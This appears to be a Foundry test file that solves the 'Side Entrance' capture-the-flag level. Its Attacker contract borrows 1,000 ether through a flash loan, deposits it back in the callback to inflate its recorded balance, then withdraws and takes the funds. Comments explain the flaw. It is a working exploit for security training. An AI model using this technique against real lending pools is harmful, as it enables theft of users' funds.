// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../../src/side-entrance/SideEntranceLevel.sol";

interface IPool {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256) external;
}

contract Attacker {
  IPool internal immutable pool;

  constructor(address poolAddress) {
    pool = IPool(poolAddress);
  }

  function attack() external {
    // we borrow the funds, the flashLoan() function will
    // call execute() and we deposit() these funds in there,
    // incrementing our balance in the pool.
    pool.flashLoan(1_000 ether);
    // as withdraw() only checks the balances[] mapping,
    // we will get the amount recorded there.
    pool.withdraw();

    // pass the funds to the player
    (bool success,) = msg.sender.call{value: 1_000 ether}("");
    success;
  }

  function execute() external payable {
    pool.deposit{value: msg.value}();
  }

  receive() external payable {}
}

contract SideEntranceTest is Test {
  SideEntranceLevel level = new SideEntranceLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    Attacker attacker = new Attacker(address(level.pool()));
    attacker.attack();

    level.validate();
  }

  receive() external payable {}
}
